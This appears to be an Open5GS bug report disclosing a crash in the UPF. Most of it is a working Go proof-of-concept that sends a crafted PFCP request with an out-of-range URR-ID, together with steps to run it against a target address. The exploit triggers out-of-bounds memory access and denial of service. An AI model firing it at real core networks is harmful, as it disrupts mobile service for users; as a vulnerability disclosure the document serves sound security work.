V2.7.5

### Steps to reproduce

### Description

When the UPF receives a PFCP Session Establishment Request containing a CreateURR with URR-ID 65535 and Measurement Information ISTM=1, the UPF crashes.


### Steps to reproduce
1. Start a new go project inside a new folder: go mod init poc
2. Create a main.go and paste the code below:
```
package main

import (
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"strings"
	"time"

	"github.com/wmnsk/go-pfcp/ie"
	"github.com/wmnsk/go-pfcp/message"
)

const (
	defaultPFCPPort = 8805
	readTimeout     = 5 * time.Second
)

type pfcpClient struct {
	nodeIP net.IP
	seid   uint64
	seq    uint32
}

func (c *pfcpClient) nextSeq() uint32 {
	c.seq++
	if c.seq == 0 || c.seq > 0x00ffffff {
		c.seq = 1
	}
	return c.seq
}

func (c *pfcpClient) mandatoryIEs() []*ie.IE {
	return []*ie.IE{
		ie.NewNodeID(c.nodeIP.String(), "", ""),
		ie.NewFSEID(c.seid, c.nodeIP, nil),
		ie.NewPDNType(ie.PDNTypeIPv4),
	}
}

func (c *pfcpClient) baseCreatePDR(pdiExtras ...*ie.IE) *ie.IE {
	pdi := []*ie.IE{
		ie.NewSourceInterface(ie.SrcInterfaceAccess),
		ie.NewFTEID(0x01, 0xABCDEF01, c.nodeIP, nil, 0),
	}
	pdi = append(pdi, pdiExtras...)
	return ie.NewCreatePDR(
		ie.NewPDRID(1),
		ie.NewPrecedence(200),
		ie.NewPDI(pdi...),
		ie.NewFARID(1),
	)
}

func (c *pfcpClient) baseCreateFAR(extra ...*ie.IE) *ie.IE {
	forwarding := []*ie.IE{
		ie.NewDestinationInterface(ie.DstInterfaceAccess),
	}
	forwarding = append(forwarding, extra...)
	return ie.NewCreateFAR(
		ie.NewFARID(1),
		ie.NewApplyAction(0x02),
		ie.NewForwardingParameters(forwarding...),
	)
}

func (c *pfcpClient) buildSession(ies ...*ie.IE) *message.SessionEstablishmentRequest {
	payload := append([]*ie.IE{}, c.mandatoryIEs()...)
	payload = append(payload, ies...)
	return message.NewSessionEstablishmentRequest(0, 0, c.seid, c.nextSeq(), 0, payload...)
}

func (c *pfcpClient) sendAssociation(conn *net.UDPConn) error {
	req := message.NewAssociationSetupRequest(
		c.nextSeq(),
		ie.NewNodeID(c.nodeIP.String(), "", ""),
		ie.NewRecoveryTimeStamp(time.Now()),
		ie.NewCPFunctionFeatures(0x3f),
	)

	payload, err := req.Marshal()
	if err != nil {
		return fmt.Errorf("marshal: %w", err)
	}
	if _, err := conn.Write(payload); err != nil {
		return fmt.Errorf("write: %w", err)
	}

	_ = conn.SetReadDeadline(time.Now().Add(readTimeout))
	buf := make([]byte, 2048)
	if _, err := conn.Read(buf); err != nil {
		if ne, ok := err.(net.Error); ok && ne.Timeout() {
			return nil
		}
		return fmt.Errorf("read: %w", err)
	}
	return nil
}

func buildOversizedURRID(client *pfcpClient) ([]byte, error) {
	urr := ie.NewCreateURR(
		ie.NewURRID(0xffff),
		ie.NewMeasurementMethod(0, 1, 0),       // volume only to keep things simple
		ie.NewReportingTriggers(0x02, 0x00, 0), // volume threshold
		ie.NewMeasurementInformation(0xff),     // set ISTM bit so timers run immediately
	)
	pdr := ie.NewCreatePDR(
		ie.NewPDRID(1),
		ie.NewPrecedence(200),
		ie.NewPDI(
			ie.NewSourceInterface(ie.SrcInterfaceAccess),
			ie.NewFTEID(0x01, 0xABCDEF01, client.nodeIP, nil, 0),
		),
		ie.NewFARID(1),
		ie.NewURRID(0xffff),
	)
	far := client.baseCreateFAR()
	req := client.buildSession(pdr, far, urr)
	return req.Marshal()
}

func resolveTarget(target string) (string, error) {
	if strings.Contains(target, ":") {
		return target, nil
	}
	return fmt.Sprintf("%s:%d", target, defaultPFCPPort), nil
}

func sendPayload(conn *net.UDPConn, payload []byte, desc string) error {
	log.Printf("Sending %s (%d bytes)", desc, len(payload))
	if _, err := conn.Write(payload); err != nil {
		return fmt.Errorf("write: %w", err)
	}

	buf := make([]byte, 2048)
	_ = conn.SetReadDeadline(time.Now().Add(readTimeout))
	if _, err := conn.Read(buf); err != nil {
		if ne, ok := err.(net.Error); ok && ne.Timeout() {
			log.Printf("  No response (timeout) – crash expected once URR timers touch sess->urr_acc[URR-ID]")
			return nil
		}
		return fmt.Errorf("read: %w", err)
	}
	log.Printf("  Target responded – inspect UPF logs for array index assert")
	return nil
}

func main() {
	var (
		target    = flag.String("target", "127.0.0.1:8805", "UPF PFCP endpoint")
		nodeIPStr = flag.String("node-ip", "10.0.0.1", "Local NodeID (IPv4)")
		skipAssoc = flag.Bool("skip-assoc", false, "Skip PFCP Association Setup")
		seidFlag  = flag.Uint64("seid", 0, "Override CP F-SEID")
	)
	flag.Parse()

	nodeIP := net.ParseIP(*nodeIPStr)
	if nodeIP == nil {
		log.Fatalf("invalid node-ip: %s", *nodeIPStr)
	}

	resolvedTarget, err := resolveTarget(*target)
	if err != nil {
		log.Fatalf("resolve target: %v", err)
	}

	remoteAddr, err := net.ResolveUDPAddr("udp", resolvedTarget)
	if err != nil {
		log.Fatalf("resolve UDP addr: %v", err)
	}

	conn, err := net.DialUDP("udp", nil, remoteAddr)
	if err != nil {
		log.Fatalf("dial PFCP: %v", err)
	}
	defer conn.Close()

	seid := *seidFlag
	if seid == 0 {
		rand.Seed(time.Now().UnixNano())
		seid = uint64(rand.Uint32())<<32 | uint64(rand.Uint32())
	}

	client := &pfcpClient{nodeIP: nodeIP, seid: seid, seq: uint32(rand.Intn(0x00ffffff))}

	if !*skipAssoc {
		log.Printf("Sending Association Setup Request to %s", resolvedTarget)
		if err := client.sendAssociation(conn); err != nil {
			log.Printf("association setup: %v", err)
		} else {
			log.Printf("✓ Association established")
		}
	}

	log.Printf("=== PoC18: URR-ID bounds bypass (src/upf/context.c:691,735,794,834...) ===")
	log.Printf("Open5GS stores per-URR accounting data in a fixed sess->urr_acc[16] array but never")
	log.Printf("validates URR-ID before indexing it. This message installs URR-ID 65535 together with")
	log.Printf("Measurement Information ISTM=1 so upf_sess_urr_acc_timers_setup() dereferences")
	log.Printf("sess->urr_acc[65534], corrupting memory or triggering an immediate crash.")

	payload, err := buildOversizedURRID(client)
	if err != nil {
		log.Fatalf("build PoC payload: %v", err)
	}

	if err := sendPayload(conn, payload, "Create URR with ID 65535"); err != nil {
		log.Fatalf("send payload: %v", err)
	}
}
```
3. Download required libraries: `go mod tidy`
4. Run the program with the upf pfcp server address: `go run ./main.go -target 10.33.33.3:8805`


### Logs

